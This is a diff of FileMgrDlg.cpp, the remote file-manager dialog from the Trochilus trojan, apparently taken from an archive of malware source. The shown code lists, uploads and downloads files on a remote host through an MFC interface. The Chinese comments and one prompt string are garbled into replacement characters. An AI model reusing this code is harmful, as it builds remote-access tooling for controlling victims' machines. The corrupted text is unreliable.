@@ -1,4 +1,15 @@
-// FileMgrDlg.cpp : ÊµÏÖÎÄ¼þ
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
+// FileMgrDlg.cpp : Êµï¿½ï¿½ï¿½Ä¼ï¿½
 //
 
 #include "stdafx.h"
@@ -11,7 +22,7 @@
 #include "FilePanelDlg.h"
 
 
-// CFileMgrDlg ¶Ô»°¿ò
+// CFileMgrDlg ï¿½Ô»ï¿½ï¿½ï¿½
 
 IMPLEMENT_DYNAMIC(CFileMgrDlg, CDialogEx)
 
@@ -144,11 +155,11 @@ void CFileMgrDlg::InsertFileList( char* lpJson,BOOL isRemote )
 		return;
 	}
 
-	//Çå¿ÕÔ­ÓÐÊý¾Ý
+	//ï¿½ï¿½ï¿½Ô­ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	CListCtrl* list;
 	int nImage = 0;
 	
-	//ÐÞ¸ÄÁÐ×Ö¶Î
+	//ï¿½Þ¸ï¿½ï¿½ï¿½ï¿½Ö¶ï¿½
 	Json::Value j = root[(UINT)0];
 	if (j["filetype"] == "disk")
 	{
@@ -163,7 +174,7 @@ void CFileMgrDlg::InsertFileList( char* lpJson,BOOL isRemote )
 		SetColumn(list,_T("Edit Time"),2,70);
 	}
 
-	//Ñ­»·²åÈë
+	//Ñ­ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	for (UINT i = 0 ; i < root.size() ; i++)
 	{
 		Json::Value value = root[i];
@@ -183,7 +194,7 @@ void CFileMgrDlg::InsertFileList( char* lpJson,BOOL isRemote )
 		else if (value["filetype"] == "file")
 		{
 			list = (isRemote ? &m_rFileList : &m_lFileList);
-			//»ñÈ¡ÎÄ¼þÍ¼±êÐÅÏ¢
+			//ï¿½ï¿½È¡ï¿½Ä¼ï¿½Í¼ï¿½ï¿½ï¿½ï¿½Ï¢
 			nImage = m_ImageList.Add(GetFileIcon(a2t(value["filename"].asCString())));
 
 			value["edittime"] = CStringA(common::FormatSystemTime(time)).GetBuffer();
@@ -399,7 +410,7 @@ void CFileMgrDlg::OnBnClickedButtonUpload()
 
 	if (IsEquPath(filename,TRUE))
 	{
-		int ret = AfxMessageBox(_T("Overwrite£¿"),MB_YESNO);
+		int ret = AfxMessageBox(_T("Overwriteï¿½ï¿½"),MB_YESNO);
 
 		if (ret == IDNO)
 			return;
@@ -444,7 +455,7 @@ void CFileMgrDlg::OnBnClickedButtonDown()
 
 	if (IsEquPath(filename,FALSE))
 	{
-		int ret = AfxMessageBox(_T("Overwrite£¿"),MB_YESNO);
+		int ret = AfxMessageBox(_T("Overwriteï¿½ï¿½"),MB_YESNO);
 		
 		if (ret == IDNO)
 			return;
@@ -546,7 +557,7 @@ void CFileMgrDlg::OnNMRClickListRfile(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
 
-	//·ÀÖ¹ÔÚ¿Õ°×Çøµã»÷µ¯³ö²Ëµ¥
+	//ï¿½ï¿½Ö¹ï¿½Ú¿Õ°ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ëµï¿½
 	if (m_rFileList.GetSelectedCount() > 0)
 	{
 		return;
@@ -582,7 +593,7 @@ void CFileMgrDlg::OnClickDownFile()
 	dlg.DoModal();
 	
 
-	//·¢ËÍÏÂÔØÏûÏ¢
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 
 }
 void CFileMgrDlg::OnSize(UINT nType, int cx, int cy)
@@ -665,7 +676,7 @@ void CFileMgrDlg::InitResize()
 
 void CFileMgrDlg::OnSysCommand(UINT nID, LPARAM lParam)
 {
-	// TODO: ÔÚ´ËÌí¼ÓÏûÏ¢´¦Àí³ÌÐò´úÂëºÍ/»òµ÷ÓÃÄ¬ÈÏÖµ
+	// TODO: ï¿½Ú´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½ï¿½ï¿½Ä¬ï¿½ï¿½Öµ
 
 	__super::OnSysCommand(nID, lParam);
 }
